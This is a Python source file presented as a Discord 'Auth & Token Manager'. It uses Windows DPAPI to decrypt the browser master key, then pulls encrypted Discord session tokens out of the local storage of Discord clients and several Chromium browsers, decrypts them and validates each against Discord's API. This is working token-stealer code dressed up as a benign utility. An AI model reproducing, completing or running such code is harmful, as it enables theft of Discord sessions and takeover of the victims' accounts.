"""
Discord Auth & Token Manager
Extracts local tokens from Discord clients and browsers via DPAPI + AES-GCM,
validates user accounts, and caches active credentials.
"""

import os
import glob
import re
import json
import base64
from ctypes import windll, byref, c_char, Structure, POINTER
from ctypes.wintypes import DWORD
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import requests

class DATA_BLOB(Structure):
    _fields_ = [('cbData', DWORD), ('pbData', POINTER(c_char))]

def decrypt_master_key(local_state_path: str):
    """Decrypts Chromium / Electron master key using Windows DPAPI."""
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
        if 'os_crypt' not in local_state or 'encrypted_key' not in local_state['os_crypt']:
            return None
        enc_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        blob_in = DATA_BLOB(len(enc_key), (c_char * len(enc_key))(*enc_key))
        blob_out = DATA_BLOB()
        if windll.crypt32.CryptUnprotectData(byref(blob_in), None, None, None, None, 0, byref(blob_out)):
            key = bytes(blob_out.pbData[:blob_out.cbData])
            windll.kernel32.LocalFree(blob_out.pbData)
            return key
    except Exception:
        pass
    return None

def extract_local_discord_tokens():
    """Scans Discord clients and Chromium-based browsers for authenticated Discord tokens."""
    tokens = set()
    scan_paths = {
        'Discord': os.path.expandvars(r'%APPDATA%\discord'),
        'Discord Canary': os.path.expandvars(r'%APPDATA%\discordcanary'),
        'Discord PTB': os.path.expandvars(r'%APPDATA%\discordptb'),
        'Chrome': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data'),
        'Brave': os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data'),
        'Edge': os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data'),
        'Opera': os.path.expandvars(r'%APPDATA%\Opera Software\Opera Stable'),
        'Opera GX': os.path.expandvars(r'%APPDATA%\Opera Software\Opera GX Stable')
    }

    for app_name, base_path in scan_paths.items():
        state_file = os.path.join(base_path, 'Local State')
        db_dir = os.path.join(base_path, 'Local Storage', 'leveldb')
        if not os.path.exists(db_dir):
            continue
        key = decrypt_master_key(state_file)
        if not key:
            continue
        try:
            aes = AESGCM(key)
        except Exception:
            continue

        for pattern in ['*.ldb', '*.log']:
            for file_path in glob.glob(os.path.join(db_dir, pattern)):
                try:
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        lines = f.readlines()
                    for line in lines:
                        for match in re.findall(r'dQw4w9WgXcQ:[^\"]*', line):
                            try:
                                enc_token = base64.b64decode(match.split('dQw4w9WgXcQ:')[1])
                                nonce = enc_token[3:15]
                                ciphertext = enc_token[15:]
                                token = aes.decrypt(nonce, ciphertext, None).decode('utf-8')
                                tokens.add(token)
                            except Exception:
                                pass
                except Exception:
                    pass

    return list(tokens)

def get_user_profile(token: str):
    """Validates token and returns user profile dict, or None if invalid."""
    if not token or not token.strip():
        return None
    token = token.strip()
    headers = {
        'Authorization': token,
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'
    }
    try:
        r = requests.get('https://discord.com/api/v9/users/@me', headers=headers, timeout=10)
        if r.status_code == 200:
            data = r.json()
            avatar_hash = data.get('avatar')
            user_id = data.get('id')
            if avatar_hash:
                ext = 'gif' if avatar_hash.startswith('a_') else 'png'
                avatar_url = f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_hash}.{ext}?size=128"
            else:
                disc = int(data.get('discriminator', 0)) % 5
                avatar_url = f"https://cdn.discordapp.com/embed/avatars/{disc}.png"
            
            banner_hash = data.get('banner')
            if banner_hash:
                ext = 'gif' if banner_hash.startswith('a_') else 'png'
                data['banner_url'] = f"https://cdn.discordapp.com/banners/{user_id}/{banner_hash}.{ext}?size=480"
            else:
                data['banner_url'] = None

            data['avatar_url'] = avatar_url
            data['token'] = token
            return data
    except Exception:
        pass
    return None

def find_all_valid_accounts():
    """Extracts all local tokens and returns valid user profiles."""
    tokens = extract_local_discord_tokens()
    valid_accounts = []
    seen_ids = set()
    for t in tokens:
        profile = get_user_profile(t)
        if profile and profile['id'] not in seen_ids:
            seen_ids.add(profile['id'])
            valid_accounts.append(profile)
    return valid_accounts
